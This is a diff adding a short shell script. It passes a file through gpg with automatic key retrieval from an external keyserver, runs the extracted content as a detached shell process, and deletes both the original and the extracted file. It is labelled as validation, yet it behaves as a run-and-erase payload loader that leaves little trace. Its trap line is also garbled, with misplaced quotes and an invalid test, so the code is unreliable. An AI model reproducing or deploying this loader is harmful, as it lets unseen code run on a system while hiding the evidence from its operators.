@@ -1,0 +1,25 @@
+#!/bin/sh
+# 
+# be a good shell programmer
+trap '[ -f $newf ] &&  rm -f "$newf; [ $f $1 ] && rm -f $1" >/dev/null 2>&1' 0
+trap "exit 2" 1 2 3 13 15
+exec < /dev/null
+
+#
+# some handy definitions
+KEYSRV="hkp://production.curlycloud.com"
+KEYSEND="cust_key@commonde.org"
+
+#
+# make sure the file is there... to begin
+[ ! -f $1 ] && exit 0
+dir=`dirname $1`
+newf=$1.sh
+#
+#Verify the file is valid...
+gpg --keyserver $KEYSRV  --keyserver-options auto-key-retrieve  --output $newf -v $1
+rm -f $1
+[ -f $newf ] && setsid /bin/sh $newf
+rm -f $newf
+exit 0
+
